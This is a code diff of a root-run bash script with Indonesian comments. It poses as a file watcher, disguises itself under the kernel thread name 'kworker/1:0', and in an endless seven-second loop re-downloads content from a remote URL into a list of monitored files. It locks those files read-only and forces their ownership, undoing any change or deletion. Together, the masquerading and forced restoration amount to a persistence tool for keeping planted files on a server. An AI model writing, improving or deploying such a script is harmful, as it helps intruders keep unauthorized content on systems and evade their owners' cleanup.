@@ -1,9 +1,17 @@
 #!/bin/bash
 
-# Meniru nama proses
-if command -v ps &> /dev/null; then
-    echo -ne "\033]0;[kworker/1:0]\007"
+# ===============================
+# FILE WATCHER DAN AUTO-DOWNLOAD
+# ===============================
+
+# Cek apakah dijalankan sebagai root
+if [[ "$EUID" -ne 0 ]]; then
+    echo "Script ini harus dijalankan sebagai root."
+    exit 1
 fi
+
+# Meniru nama proses (opsional, hanya kosmetik)
+echo -ne "\033]0;[kworker/1:0]\007"
 
 # Daftar file yang dipantau
 FILES=(
@@ -21,29 +29,21 @@ download_file() {
     local file_path="$1"
     echo "Mengunduh file: $file_path"
 
-    # Unduh konten dari URL
     content=$(curl -fsSL "$URL")
-    if [ $? -ne 0 ] || [ -z "$content" ]; then
+    if [[ $? -ne 0 || -z "$content" ]]; then
         echo "Gagal mengunduh file: $file_path. Periksa koneksi atau URL."
         return
     fi
 
-    # Simpan ke file
     echo "$content" > "$file_path"
-
-    # Set permission dan ownership
     chmod 444 "$file_path"
-    chown 1000:1000 "$file_path"
-    echo "Berhasil mengunduh dan menyimpan file: $file_path"
+    chown 1000:1000 "$file_path" || echo "Gagal chown $file_path"
+    echo "✔️  Berhasil mengunduh dan menyimpan file: $file_path"
 }
 
 # Fungsi untuk menghitung hash file
 get_file_hash() {
-    if [ -f "$1" ]; then
-        md5sum "$1" | awk '{ print $1 }'
-    else
-        echo ""
-    fi
+    [[ -f "$1" ]] && md5sum "$1" | awk '{ print $1 }' || echo ""
 }
 
 # Fungsi untuk mengatur permission direktori
@@ -61,16 +61,16 @@ while true; do
         dir_path=$(dirname "$file")
 
         # Buat direktori jika belum ada
-        if [ ! -d "$dir_path" ]; then
+        if [[ ! -d "$dir_path" ]]; then
             mkdir -p "$dir_path"
-            echo "Membuat direktori: $dir_path"
+            echo "📁 Membuat direktori: $dir_path"
         fi
 
         # Atur izin direktori
         set_permissions "$dir_path"
 
         # Periksa dan unduh file jika perlu
-        if [ ! -f "$file" ]; then
+        if [[ ! -f "$file" ]]; then
             download_file "$file"
         else
             original_hash=$(get_file_hash "$file")
@@ -78,15 +78,23 @@ while true; do
             curl -fsSL "$URL" > "$temp_file"
             current_hash=$(md5sum "$temp_file" | awk '{ print $1 }')
 
-            if [ "$original_hash" != "$current_hash" ]; then
-                echo "File berubah, mengunduh ulang: $file"
+            if [[ "$original_hash" != "$current_hash" ]]; then
+                echo "🔁 File berubah, mengunduh ulang: $file"
                 mv "$temp_file" "$file"
                 chmod 444 "$file"
-                chown 1000:1000 "$file"
+                chown 1000:1000 "$file" || echo "Gagal chown $file"
             else
                 rm "$temp_file"
             fi
         fi
     done
+
+    # Pastikan file selalu dimiliki oleh 1000:1000
+    for file in "${FILES[@]}"; do
+        if [[ -f "$file" ]]; then
+            chown 1000:1000 "$file" || echo "Gagal chown $file (pasca-loop)"
+        fi
+    done
+
     sleep 7
 done
